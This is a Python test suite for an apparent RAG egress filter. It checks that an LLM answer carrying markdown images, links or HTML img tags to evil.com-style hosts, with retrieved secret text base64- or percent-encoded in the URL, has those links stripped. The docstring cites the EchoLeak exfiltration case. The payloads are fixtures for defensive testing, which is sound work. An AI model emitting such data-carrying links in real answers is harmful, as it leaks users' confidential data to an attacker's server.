"""Stage 3 egress: a retrieved chunk may supply facts but may never cause an egress.
Data-carrying links are removed whatever their encoding, and nothing auto-loads from
a host that isn't allowlisted (the rendering boundary EchoLeak crossed)."""

import base64
import urllib.parse

from hypothesis import given, settings, strategies as st

from triad.contract import Chunk, Provenance
from triad.stage3.egress import inspect_answer

SECRET = "The Q3 salary sheet shows Jeff Skilling compensation at 4.2 million dollars for fiscal year"
CTX = [Chunk(id="m1", text=SECRET, tenant="alice", source_type="email", provenance=Provenance("enronqa", "m1", "real"))]
ALLOW = frozenset({"intranet.corp.com"})
B64 = base64.urlsafe_b64encode(SECRET.encode()).decode()
PCT = urllib.parse.quote(SECRET)


def check(answer, **kw):
    return inspect_answer(answer, CTX, allow_hosts=ALLOW, **kw)


def test_base64_data_image_removed_prose_kept():
    d = check(f"Here is the summary. ![logo](https://evil.com/p.png?d={B64}) Thanks.")
    assert not d.allow and "evil.com" not in d.rewritten
    assert "Here is the summary." in d.rewritten and "Thanks." in d.rewritten


def test_percent_encoded_image_removed():
    assert "evil.com" not in check(f"Summary. ![x](https://evil.com/i?q={PCT})").rewritten


def test_reference_style_image_removed():
    d = check(f"Summary ![a][1]\n\n[1]: https://evil.com/?q={PCT}")
    assert not d.allow and "evil.com" not in d.rewritten


def test_raw_html_img_removed():
    assert "evil.com" not in check(f'Summary <img src="https://evil.com/?d={B64}">').rewritten


def test_untainted_image_to_unknown_host_still_stripped():
    d = check("See ![chart](https://charts.example.org/q3.png)")
    assert not d.allow and "charts.example.org" not in d.rewritten


def test_allowlisted_clean_image_kept():
    assert check("See ![chart](https://intranet.corp.com/q3.png)").allow


def test_clean_plain_link_kept_tainted_plain_link_delinked():
    assert check("Docs at [policy](https://docs.example.org/policy?id=42).").allow
    d = check(f"[click](https://evil.com/?q={PCT})")
    assert not d.allow and "evil.com" not in d.rewritten and "click" in d.rewritten


def test_secret_in_url_removed_even_if_not_in_context():
    d = inspect_answer("See [x](https://files.example.org/?k=sk-live-ABCDEF1234567890)", [],
                       secrets=("sk-live-ABCDEF1234567890",))
    assert not d.allow and "sk-live" not in d.rewritten


def test_answer_without_links_is_allowed():
    assert check("Q3 compensation was discussed in the thread.").allow


def test_garbage_input_fails_closed():
    assert not inspect_answer(None, []).allow


words = st.lists(st.sampled_from("alpha bravo charlie delta echo foxtrot golf hotel india juliet kilo lima".split()),
                 min_size=8, max_size=30)


@settings(max_examples=60, deadline=None)
@given(words=words, start=st.integers(0, 100), enc=st.sampled_from(["plain", "pct", "b64"]),
       kind=st.sampled_from(["image", "link"]))
def test_no_surviving_url_carries_a_20_char_window_of_context(words, start, enc, kind):
    text = " ".join(words)
    s = start % max(1, len(text) - 20)
    window = text[s:s + 24]
    ctx = [Chunk(id="c", text=text, tenant="t", source_type="email", provenance=Provenance("enronqa", "c", "real"))]
    payload = {"plain": window.replace(" ", "+"), "pct": urllib.parse.quote(window),
               "b64": base64.urlsafe_b64encode(window.encode()).decode()}[enc]
    url = f"https://evil.example.net/x?d={payload}"
    answer = f"Summary. ![i]({url})" if kind == "image" else f"Summary. [see]({url})"
    out = inspect_answer(answer, ctx).rewritten or answer
    assert payload not in out
